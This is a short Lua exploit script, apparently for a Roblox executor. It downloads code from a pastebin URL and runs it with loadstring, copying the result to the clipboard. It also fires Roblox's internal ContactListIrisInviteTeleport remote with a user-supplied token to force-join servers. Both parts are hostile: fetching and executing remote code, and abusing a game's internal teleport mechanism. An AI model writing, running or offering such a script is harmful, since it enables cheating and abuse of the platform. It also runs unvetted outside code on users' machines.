-- hi skid
if getgenv().gentoken == true then
    local generate = "https://pastebin.com/raw/tkeqc2pw"
    local code = loadstring(game:HttpGet(generate))()
    setclipboard(code)
end

if getgenv().jointoken == true and getgenv().settoken and getgenv().settoken ~= "" then
    game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", getgenv().settoken)
end
